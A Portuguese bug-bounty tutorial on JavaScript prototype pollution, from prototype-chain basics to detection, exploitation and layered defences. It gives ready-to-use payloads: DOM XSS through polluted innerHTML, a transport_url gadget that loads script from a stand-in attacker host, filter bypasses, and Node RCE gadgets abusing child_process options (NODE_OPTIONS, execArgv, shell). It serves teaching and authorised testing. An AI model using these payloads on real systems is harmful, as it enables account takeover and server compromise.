---
title: "Prototype Pollution: envenenando o Object do JavaScript"
description: "Como uma única propriedade injetada no prototype contamina todos os objetos do JavaScript — e vira DOM XSS no navegador ou até RCE no Node."
author: matheus
date: 2026-05-26 10:14:00 -0300
categories: [Bug Bounty, Vulnerabilidades]
tags: ["prototype pollution", "JavaScript", "Node.js", "DOM XSS", "RCE", "OWASP", "bug bounty", "web security"]
image: /assets/img/covers/prototype-pollution.png
pin: false
comments: true
---

## Uma propriedade que contamina o programa inteiro

Imagina que você manda esse parâmetro inocente na URL de uma SPA:

```
https://app.exemplo.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

A página recarrega e... `alert(1)`. Você não tocou em nenhum campo, não achou um `<input>` refletido, não passou por um sanitizador. Você injetou uma propriedade no **prototype global** do JavaScript, e um trecho qualquer da aplicação leu essa propriedade achando que era dele. Isso é **Prototype Pollution** (poluição de prototype): uma das classes mais elegantes — e mais subestimadas — da segurança web moderna.

É elegante porque ataca o **núcleo da linguagem**, não a aplicação. E é subestimada porque sozinha ela quase nunca "faz nada": ela é uma **primitiva** (uma capacidade base) que precisa de um segundo ingrediente, o *gadget*, pra virar algo crítico. Quando os dois se encontram, o resultado vai de [DOM XSS](/posts/xss-html-injection/) no navegador a [RCE](/posts/rce-command-injection-ssti/) (execução remota de código) no servidor.

> 💡 **Prototype Pollution**: vulnerabilidade em que o atacante injeta propriedades no prototype de `Object`, que passam a ser herdadas por **todos** os objetos do programa.

Neste post a gente parte do zero (o que é prototype em JS) e chega no avançado (RCE em Node via `child_process`), com payloads verificados e defesa de verdade.

## O que é prototype e herança em JavaScript

Pra entender a falha, primeiro o alicerce. Em JavaScript, **todo objeto tem um prototype** — um objeto "pai" do qual ele herda propriedades e métodos. Quando você acessa `obj.toString`, o JS procura `toString` no próprio `obj`; se não acha, sobe pro prototype; se não acha lá, sobe pro prototype do prototype, e assim por diante. Isso é a **cadeia de prototypes** (prototype chain).

> 💡 **Prototype**: objeto "molde/pai" do qual outro objeto herda propriedades; o motor do JS consulta a cadeia de prototypes quando não acha a propriedade no próprio objeto.

> 💡 **Herança**: mecanismo em que um objeto reutiliza propriedades/métodos definidos em outro (aqui, no seu prototype).

No topo dessa cadeia, para objetos comuns, está sempre o mesmo objeto: **`Object.prototype`**. Veja no console do navegador:

```javascript
const usuario = { nome: "Ana" };
usuario.toString();              // "[object Object]" — herdado de Object.prototype
Object.getPrototypeOf(usuario) === Object.prototype;  // true
usuario.__proto__ === Object.prototype;               // true (mesma coisa, atalho legado)
```

> **Analogia:** pense no `Object.prototype` como o **manual padrão da fábrica** que vem dentro de **todo** produto. Se alguém conseguir editar esse manual mestre, todo produto que sair da fábrica — e todos os que já existem — passa a "saber" daquela instrução nova. Não importa o modelo: geladeira, TV, micro-ondas. Todos herdam.

Duas formas de chegar nesse manual mestre a partir de qualquer objeto:

| Caminho | Exemplo | Observação |
|---|---|---|
| `__proto__` | `usuario.__proto__` | Atalho (getter/setter) que aponta pro prototype do objeto |
| `constructor.prototype` | `usuario.constructor.prototype` | `usuario.constructor` é `Object`; `Object.prototype` é o mesmo manual mestre |

Ambos levam ao **mesmo** `Object.prototype`. Guarde esses dois nomes: eles são as duas chaves que o atacante usa.

## O que é "poluir o prototype" (e por que afeta tudo)

Poluir o prototype é **escrever** uma propriedade em `Object.prototype` a partir de uma entrada controlada pelo atacante. Como todo objeto herda dele, a propriedade injetada aparece **em todos os objetos** que não a definiram explicitamente. Teste no console:

```javascript
const a = {};
a.__proto__.poluido = "sim";     // escrevendo no prototype mestre via __proto__

const b = {};                    // objeto novo, recém-criado
b.poluido;                       // "sim"  <- ele NUNCA recebeu isso; herdou do prototype
({}).poluido;                    // "sim"  <- até um objeto literal vazio "tem"
```

Repare: o objeto `b` jamais recebeu `poluido`. Ele **herdou** porque a propriedade está no manual mestre. Esse é o coração da falha — você não modifica *um* objeto, você modifica o **comportamento padrão de todos eles**.

Por que `__proto__` causa isso? Porque, em JavaScript, `__proto__` **não é uma propriedade comum**: é um acessor especial (definido no próprio `Object.prototype`) que, ao ser **lido**, retorna o prototype do objeto. Então `obj["__proto__"]["x"] = 1` não cria a chave literal `"__proto__"` dentro de `obj` — ele resolve `obj.__proto__` para `Object.prototype` e escreve `x` **lá**. É exatamente esse comportamento que código vulnerável aciona sem perceber.

## Impacto e quanto paga

Sozinha, a poluição raramente é o fim — ela é a **primitiva**. O impacto vem do **gadget** que ela alimenta:

> 💡 **Gadget**: um trecho do código (da app ou de uma lib) que **lê** uma propriedade que o atacante consegue poluir e a usa de forma perigosa (ex.: joga em `innerHTML`, `eval`, opções de `child_process`).

- **Client-side → DOM XSS**: uma propriedade poluída cai num sink perigoso do DOM e executa JavaScript no navegador da vítima. Daí o caminho é o mesmo de qualquer [XSS](/posts/xss-html-injection/): roubo de sessão, ações na conta, [Account Takeover](/posts/account-takeover/).
- **Server-side (Node.js) → DoS, bypass de lógica/auth e RCE**: derrubar o processo (negação de serviço), burlar checagens que leem flags herdadas, ou — no pior caso — execução remota de código no servidor.

> 💡 **Sink**: o "ponto de chegada" perigoso onde dado controlável vira efeito (executar HTML/JS, rodar comando, etc.). O oposto é a *source* (ponto de entrada).

Em programas de bug bounty, o valor segue o impacto: um prototype pollution **isolado, sem gadget demonstrável**, costuma ser tratado como informativo ou pagar pouco (de algumas centenas de reais). Encadeado num **DOM XSS confiável** já entra em faixa de milhares; e um **RCE em Node** confirmado vai para o topo da tabela (dezenas de milhares), porque é uma das consequências mais graves possíveis. Lição: **prototype pollution só "vale" o que o gadget entrega** — invista em achar o gadget. Veja [Severidade e Triagem](/posts/severidade-impacto-triagem/) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/).

> ⚠️ A falha ficou famosa depois da pesquisa de **Olivier Arteau** (NorthSec 2018), que mostrou como atacar libs de `merge` no Node, e da pesquisa client-side de **Gareth Heyes / PortSwigger** sobre gadgets disseminados. Não é teoria: lodash, jQuery, Mongoose e outras libs enormes já tiveram CVEs dessa classe.

## Como funciona por trás (os vetores)

A poluição precisa de código que **escreva chaves vindas do atacante em um objeto, recursivamente, sem filtrar `__proto__`**. Três padrões dominam.

### 1. Merge / clone profundo inseguro

`merge` ("mesclar") é a operação de copiar as chaves de um objeto-fonte para um objeto-alvo. "Profundo" (deep) significa que ele desce em objetos aninhados. Uma implementação ingênua:

```javascript
// merge profundo VULNERÁVEL — copia chave por chave, recursivamente
function merge(alvo, fonte) {
  for (const chave in fonte) {
    if (typeof fonte[chave] === "object" && fonte[chave] !== null) {
      if (!alvo[chave]) alvo[chave] = {};
      merge(alvo[chave], fonte[chave]);   // recursão
    } else {
      alvo[chave] = fonte[chave];
    }
  }
  return alvo;
}
```

Se a `fonte` (controlada pelo atacante) for `{"__proto__": {"admin": true}}`, na iteração da chave `"__proto__"` o código faz `merge(alvo["__proto__"], ...)`, ou seja, `merge(Object.prototype, {"admin": true})`. Resultado: `Object.prototype.admin = true`. **Poluiu.**

```javascript
const payload = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, payload);
({}).admin;     // true  <- todo objeto agora "é admin"
```

> Por que `JSON.parse` é seguro mas o `merge` não? Porque `JSON.parse('{"__proto__":{}}')` cria um objeto com uma chave **literal** chamada `"__proto__"` (a desserialização JSON não aciona o acessor mágico). O perigo aparece quando esse objeto passa por um `merge`/`clone` recursivo: ao recursar, o código avalia `alvo["__proto__"]`, e aí sim o getter mágico dispara, resolvendo para `Object.prototype` e fazendo a escrita cair no manual mestre.

### 2. Parsing de query string

Bibliotecas que transformam `chave[sub]=valor` em objeto aninhado (padrão de muitos parsers de query string) também são vetor. Um parser ingênuo transforma:

```
?__proto__[admin]=true
```

no objeto `{ __proto__: { admin: "true" } }` e, ao construí-lo, escreve no prototype. Por isso o exemplo do início do post (`?__proto__[innerHTML]=...`) funciona em SPAs que parseiam a URL e depois mesclam esse objeto em configs.

### 3. JSON.parse + merge (o combo server-side clássico)

No servidor, o corpo da request chega como JSON, vira objeto via `JSON.parse`, e a app mescla esse objeto em alguma config/opções com um `merge` inseguro. É o vetor da pesquisa do Arteau:

```http
POST /api/perfil HTTP/2
Host: app.exemplo.com
Content-Type: application/json

{"nome":"ana","__proto__":{"admin":true}}
```

## Tipos e variações

| Tipo | Onde ocorre | Consequência mais comum |
|---|---|---|
| **Client-side (CSPP)** | No navegador: parsing de URL/hash, `JSON.parse` de `postMessage`, merges no front | DOM XSS |
| **Server-side (SSPP)** | No Node.js: merge de JSON do corpo, configs | DoS, bypass de lógica/auth, RCE |
| Via `__proto__` | Vetor direto | — |
| Via `constructor.prototype` | Quando `__proto__` é filtrado | bypass de sanitização |

## Recon — onde procurar

Prototype pollution vive onde a aplicação **constrói objetos a partir de entrada estruturada**:

- **SPAs com parsing de URL/hash**: frameworks e libs que leem `location.search`/`location.hash` e montam config.
- **Libs de `merge`/`extend`/`clone` profundo**: `lodash.merge`/`defaultsDeep`, `jQuery.extend(true, ...)`, `deep-extend`, `node.extend`, `Object.assign` aninhado feito à mão.
- **`postMessage`** que faz `JSON.parse` da `event.data` e mescla.
- **APIs Node** que recebem JSON e fazem merge em opções/config (veja [Segurança de APIs](/posts/api-security/)).

Como caçar nos arquivos JavaScript (igual ao recon de [IDOR](/posts/broken-access-control-idor-bola-bfla/) — leia os `.js`):

```bash
# coleta as URLs históricas e filtra os arquivos .js para ler
# (gau = junta URLs conhecidas do alvo; httpx = confirma quais respondem)
echo https://alvo.com | gau | grep '\.js$' | httpx -mc 200
# nos arquivos, procure as assinaturas perigosas:
#   merge( , deepExtend( , defaultsDeep( , $.extend(true , JSON.parse( , location.hash
```

> 💡 **gau / httpx**: ferramentas de [recon](/posts/recon-discovery/) — `gau` lista URLs já conhecidas de um domínio; `httpx` checa rapidamente quais estão vivas.

## Detecção passo a passo

### Client-side — o teste de 1 linha

A detecção é **não-destrutiva** e direta: injete uma propriedade-canário e cheque se ela apareceu em `Object.prototype`.

```
https://alvo.com/?__proto__[teste]=poluido
```

Depois, no **console do navegador** (DevTools → Console):

```javascript
Object.prototype.teste;   // "poluido"  -> poluição confirmada
({}).teste;               // "poluido"  -> confirma a herança
```

Se `__proto__` foi filtrado, tente as **notações alternativas** (verificadas na PortSwigger Academy):

```
https://alvo.com/?__proto__.teste=poluido            # notação com ponto
https://alvo.com/?constructor[prototype][teste]=x    # via constructor.prototype
https://alvo.com/?constructor.prototype.teste=x
```

E o bypass clássico de sanitização **não-recursiva** (quando o filtro remove `__proto__` só uma vez):

```
?__pro__proto__to__[teste]=x     # vira "__proto__" depois que o filtro tira o miolo
```

### Server-side — detecção sem ver o código

No servidor você não tem console. As técnicas da PortSwigger exploram **efeitos colaterais observáveis** na resposta:

1. **Reflexão de propriedade** — injete e veja se volta:

```json
{"__proto__": {"foo": "bar"}}
```
Se a resposta passar a refletir `"foo":"bar"`, poluiu.

2. **`json spaces`** (a mais confiável, não depende de reflexão) — o Express usa a config `json spaces` pra indentar respostas JSON. Poluindo-a, **toda** resposta JSON muda a indentação:

```json
{"__proto__": {"json spaces": 10}}
```
Se as respostas JSON seguintes vierem com 10 espaços de indentação, está poluído.

3. **`status` override** — injetar um status HTTP incomum e disparar um erro depois; se a resposta de erro voltar com aquele status, confirma. O módulo `http-errors` só aceita status na faixa **400–599**, então escolha um código obscuro dessa faixa (ex.: `510`) que dificilmente apareceria por outro motivo:

```json
{"__proto__": {"status": 510}}
```

4. **`content-type` override (charset UTF-7)** — poluir o charset padrão das respostas faz o servidor decodificar a saída como UTF-7; se uma string como `+AGYAbwBv-` voltar decodificada para `foo`, confirma:

```json
{"__proto__": {"content-type": "application/json; charset=utf-7"}}
```

5. **`exposedHeaders` (CORS)** — se a app usa o módulo `cors`, poluir esse array faz seus valores aparecerem no header `Access-Control-Expose-Headers` da resposta (requer o módulo `cors` instalado):

```json
{"__proto__": {"exposedHeaders": ["foo"]}}
```

> ⚠️ **A poluição em server-side é PERSISTENTE no processo.** Você está alterando o `Object.prototype` do processo Node que atende **todos** os usuários. Em alvo de produção, isso pode quebrar o serviço pra outras pessoas (DoS acidental). Teste com canários inócuos, prefira ambientes de staging e **sempre dentro do escopo autorizado**.

## Exploração passo a passo

### Client-side → DOM XSS (via gadget)

Poluir é só metade. Você precisa de um **gadget**: um código que **lê** uma propriedade poluível e a leva a um sink de DOM XSS. Exemplo realista de gadget vulnerável:

```javascript
// gadget VULNERÁVEL: lê config.transport_url do "config" (que herda do prototype poluído)
let config = {};
// ... a app preenche algumas chaves, mas NÃO define transport_url ...
const script = document.createElement("script");
script.src = config.transport_url;   // <- se transport_url estiver poluído, carrega script do atacante
document.body.appendChild(script);
```

Como `config` não definiu `transport_url`, ele **herda** o valor poluído. Payload (verificado na PortSwigger Academy):

```
https://alvo.com/?__proto__[transport_url]=//atacante.exemplo/x.js
```

Variações com sinks diretos:

```
?__proto__[transport_url]=data:,alert(document.domain)//
?__proto__[hitCallback]=alert(document.domain)        # gadget que faz eval/chamada do valor
```

Achar o gadget na mão: no DevTools, use `Object.defineProperty` pra "armar uma armadilha" que loga quem lê a propriedade poluída:

```javascript
// pausa/loga quando QUALQUER código ler a propriedade — revela o gadget
Object.defineProperty(Object.prototype, "transport_url", {
  get() { console.trace("LEU transport_url"); return "//atacante.exemplo/x.js"; }
});
```

### Server-side → DoS e bypass de lógica

- **DoS**: poluir propriedades que o framework usa internamente pode lançar exceções em todo request e derrubar o processo. (Detalhes de DoS de aplicação em [Denial of Service](/posts/denial-of-service-aplicacao/).)
- **Bypass de lógica/auth**: se a app checa uma flag sem garantir que ela exista no próprio objeto (ex.: `if (user.isAdmin)`), poluir `Object.prototype.isAdmin = true` faz **todo** objeto-usuário "virar admin" por herança. É um caminho indireto pra [Broken Access Control](/posts/broken-access-control-idor-bola-bfla/).

### Server-side → RCE (o avançado: gadgets de `child_process`)

O gadget mais potente no Node são as **opções de `child_process`**. Quando a app cria um subprocesso (`spawn`/`exec`/`fork`) **sem passar todas as opções explicitamente**, o objeto de opções herda chaves poluídas. Payloads verificados na PortSwigger Academy:

**Via `NODE_OPTIONS` + `shell`** (prova de conceito com [SSRF](/posts/ssrf/)/out-of-band pra confirmar execução). O `NODE_OPTIONS` **bloqueia `--eval`**, mas aceita `--inspect=host:port` — ao iniciar o subprocesso, o Node tenta abrir o debugger nesse host, gerando uma interação out-of-band (DNS/HTTP no Collaborator) que confirma a execução sem precisar do filesystem:

```json
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=ID-DO-COLLABORATOR.oastify.com"}}
```

A partir do **Node 19**, o `--import` (com `data:` URL) também passa pelo `NODE_OPTIONS` e executa JS arbitrário sem tocar no disco (pesquisa PortSwigger "sem o filesystem"):

```json
{"__proto__": {"NODE_OPTIONS": "--import=\"data:text/javascript,import('child_process').then(c=>c.execSync('id'))\""}}
```

**Via `execArgv` do `fork()`** — injeta argumentos de execução do Node:

```json
{"__proto__": {"execArgv": ["--eval=require('child_process').execSync('id')"]}}
```

**Via `shell` + `input`** (abusa de um binário interativo, ex.: editor presente no servidor):

```json
{"__proto__": {"shell": "vim", "input": ":! id\n"}}
```

A mecânica geral está em [RCE / Command Injection](/posts/rce-command-injection-ssti/). A diferença aqui é que você não injeta no comando — você **envenena as opções** que o Node usa pra montar o processo.

## Caso real-fictício: CSPP → DOM XSS em SPA

> Cenário **fictício, baseado em padrões reais** (anonimizado).

Você testa `app.exemplo.com`, uma SPA. Nos arquivos `.js`, encontra uma lib que monta config a partir do hash da URL e, mais adiante, um trecho que faz `el.innerHTML = config.welcomeHTML`. Dois ingredientes na mão: source (hash) + sink (`innerHTML`).

**Passo 1 — Confirmar a source.** Acesso com canário e checo no console:

```
https://app.exemplo.com/#__proto__[canario]=1
```
```javascript
Object.prototype.canario;   // "1" -> poluível pelo hash
```

**Passo 2 — Apontar pro gadget.** `welcomeHTML` não é definido pela app naquele fluxo, então herda do prototype:

```
https://app.exemplo.com/#__proto__[welcomeHTML]=<img src=x onerror=alert(document.domain)>
```

**Passo 3 — Resultado.** A página renderiza, `config.welcomeHTML` resolve pro meu HTML herdado, `innerHTML` injeta a tag e o `onerror` dispara. **DOM XSS confirmado**, sem nenhum input clássico envolvido.

**O que a tela mostraria:** um `alert(document.domain)` na origem `app.exemplo.com`; no DevTools, `Object.prototype.welcomeHTML` mostrando o payload; no Network, nenhuma request de formulário — só a navegação com o hash.

**Passo 4 — Report.** Título `[Prototype Pollution] DOM XSS via __proto__ no hash da URL → execução de JS na origem`. Demonstre a cadeia source → gadget → sink e o impacto (sequestro de sessão). Veja [Como escrever um report que paga](/posts/como-escrever-report-que-paga/).

## Defesa em camadas

A correção real é **cortar a primitiva** (impedir escrita no prototype) e/ou **remover o gadget**. Em camadas:

**1. Congele o prototype mestre** (mata a primitiva no processo):

```javascript
Object.freeze(Object.prototype);   // tentativas de escrever em Object.prototype param de funcionar
```

> ⚠️ Detalhe importante: depois do `freeze`, a escrita **falha silenciosamente em modo não-estrito**, mas **lança `TypeError` em modo estrito** (`"use strict"`, módulos ES e corpos de `class` são sempre estritos). Em qualquer caso a poluição é bloqueada — só esteja ciente de que pode virar exceção. Congele cedo, na inicialização, antes de qualquer `merge`.

**2. Use estruturas que não herdam de `Object.prototype`:**

```javascript
const mapa = new Map();                 // Map não tem o problema de chaves mágicas
const obj = Object.create(null);        // objeto "null-prototype": sem cadeia, sem __proto__ mágico
obj.__proto__;                          // undefined — não há prototype pra poluir
```

**3. Rejeite/filtre as chaves perigosas antes de mesclar:**

```javascript
const PROIBIDAS = new Set(["__proto__", "constructor", "prototype"]);
function mergeSeguro(alvo, fonte) {
  for (const chave of Object.keys(fonte)) {
    if (PROIBIDAS.has(chave)) continue;            // <- a checagem que faltava
    // ... merge normal das demais chaves ...
  }
  return alvo;
}
```

**4. `JSON.parse` com reviver** pra descartar `__proto__` já na desserialização:

```javascript
const seguro = JSON.parse(corpo, (chave, valor) => chave === "__proto__" ? undefined : valor);
```

**5. Use libs já corrigidas e mantidas.** Ex.: lodash **≥ 4.17.12** corrigiu o [CVE-2019-10744](https://github.com/advisories/GHSA-jf85-cpcp-j695) — poluição em `defaultsDeep` via `constructor.prototype`, classificada como **Crítica: CVSS v3.1 9.1** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`; o NVD ainda não publicou score CVSS v4.0). Antes disso, `merge`/`mergeWith`/`defaultsDeep` já haviam sido afetados pelo [CVE-2018-3721](https://nvd.nist.gov/vuln/detail/CVE-2018-3721) (via `__proto__`, corrigido em 4.17.5) e pelo [CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487) (correção incompleta do anterior, via `constructor.prototype`, corrigido em 4.17.11). Mantenha dependências atualizadas — veja [Security Misconfiguration & CVE Hunting](/posts/security-misconfiguration-cve-hunting/).

**6. No Node, passe opções de `child_process` explicitamente** (não deixe herdar) e valide entrada com **schema** (defina os campos esperados; tudo fora dele é rejeitado).

**7. Endureça o runtime do Node** com a flag [`--disable-proto`](https://nodejs.org/api/cli.html#--disable-protomode), que desativa o acessor mágico `Object.prototype.__proto__` em todo o processo (`--disable-proto=delete` o remove; `=throw` lança erro ao usá-lo) — fecha o vetor mais comum sem depender de cada `merge` filtrar a chave:

```bash
node --disable-proto=delete app.js
```

> ❌ **O que NÃO basta:** filtrar só `__proto__` e esquecer `constructor`/`prototype`; filtrar uma vez só (vulnerável ao `__pro__proto__to__`); confiar que "é só client-side" — gadgets server-side existem e levam a RCE.

## Ferramentas + labs legais

- **DOM Invader** (embutido no navegador do Burp Suite): detecta automaticamente sources de prototype pollution na URL e em `postMessage`, e ainda **escaneia gadgets** e gera PoC de XSS. É o jeito mais rápido de achar CSPP — pesquisa de Gareth Heyes/PortSwigger.
- **PPScan** / extensões de "prototype pollution scanner": varrem sources client-side automaticamente enquanto você navega.
- **Server-Side Prototype Pollution Scanner** (extensão do Burp BApp Store): testa as técnicas server-side (`json spaces`, status etc.).
- **Labs autorizados:** [PortSwigger Web Security Academy — Prototype pollution](https://portswigger.net/web-security/prototype-pollution) (client-side e server-side, com labs guiados — a melhor fonte gratuita).

## Checklist do caçador

- [ ] Identifiquei **sources**: parsing de URL/hash, `postMessage` + `JSON.parse`, merges no front, corpo JSON no back.
- [ ] Testei o canário `?__proto__[teste]=x` e confirmei em `Object.prototype.teste` (console).
- [ ] Tentei as alternativas: `constructor[prototype]`, notação com ponto, e o bypass `__pro__proto__to__`.
- [ ] Server-side: testei `json spaces`, `status` (faixa 400–599), `content-type`/charset, `exposedHeaders` e reflexão de propriedade (de forma não-destrutiva, no escopo).
- [ ] **Cacei o gadget** (DOM Invader / `Object.defineProperty` armadilha) — sem gadget, o impacto é baixo.
- [ ] Client-side: liguei a propriedade poluída a um sink (`innerHTML`, `script.src`, `eval`).
- [ ] Server-side: testei gadgets de `child_process` (`shell`/`NODE_OPTIONS`/`execArgv`) com confirmação out-of-band.
- [ ] Documentei a cadeia **source → gadget → sink** no report.

## Pegadinhas e o que NÃO funciona

- **Poluir sem gadget ≠ vulnerabilidade explorável.** Muitos triagistas pedem o impacto. Sempre busque a cadeia completa.
- **`JSON.parse` sozinho não polui** — ele cria a chave literal `"__proto__"`; o estrago vem do `merge`/`clone` posterior.
- **Filtrar só `__proto__`** deixa `constructor.prototype` aberto. Bloqueie os três nomes.
- **Sanitização não-recursiva** cai pro `__pro__proto__to__`.
- **Em server-side, lembre da persistência:** sua poluição afeta outros usuários do mesmo processo — cuidado pra não causar DoS acidental.

## O que você precisa lembrar

- Todo objeto JS herda de `Object.prototype`; poluí-lo via `__proto__` ou `constructor.prototype` contamina **todos** os objetos.
- Prototype pollution é uma **primitiva**: o impacto (DOM XSS, DoS, bypass, RCE) vem do **gadget**.
- Detecção client-side é o canário `?__proto__[teste]=x` + checagem em `Object.prototype`; server-side usa efeitos como `json spaces`.
- Defesa: `Object.freeze(Object.prototype)`, `Object.create(null)`/`Map`, rejeitar `__proto__`/`constructor`/`prototype`, `node --disable-proto`, libs atualizadas.

> 💡 **Dica de ouro:** poluir é fácil, **o ouro está no gadget**. Quando confirmar a poluição, pare de comemorar e vá caçar quem **lê** aquela propriedade — é o gadget que transforma uma curiosidade em DOM XSS ou RCE. Sem ele, você tem metade de um bug.

## Nota ética

Prototype pollution server-side **altera o processo inteiro** e pode derrubar o serviço para outros usuários — teste apenas em alvos autorizados, com canários inócuos e, de preferência, em staging. Tudo aqui é para bug bounty (dentro do escopo), pentests contratados e labs legais. Use para proteger, reportar com responsabilidade e ensinar.

## Referências

- [PortSwigger — Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger — Client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side)
- [PortSwigger — Server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
- [PortSwigger Blog — Finding client-side prototype pollution with DOM Invader (Gareth Heyes)](https://portswigger.net/blog/finding-client-side-prototype-pollution-with-dom-invader)
- [PortSwigger Research — Server-side prototype pollution: Black-box detection without the DoS](https://portswigger.net/research/server-side-prototype-pollution)
- [PortSwigger Research — Exploiting prototype pollution in Node without the filesystem](https://portswigger.net/research/exploiting-prototype-pollution-in-node-without-the-filesystem)
- [Olivier Arteau — Prototype pollution attacks in NodeJS applications (NorthSec 2018)](https://github.com/HoLyVieR/prototype-pollution-nsec18)
- [OWASP — Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [GitHub Advisory — Prototype Pollution in lodash (CVE-2019-10744)](https://github.com/advisories/GHSA-jf85-cpcp-j695)

---
*Relacionado na série: [XSS e HTML Injection](/posts/xss-html-injection/) · [RCE: Command Injection, SSTI e Upload](/posts/rce-command-injection-ssti/) · [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) · [Segurança de APIs](/posts/api-security/) · [Fundamentos & Glossário](/posts/fundamentos-web-hacking/#glossário-rápido-os-termos-que-vão-aparecer-na-série)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
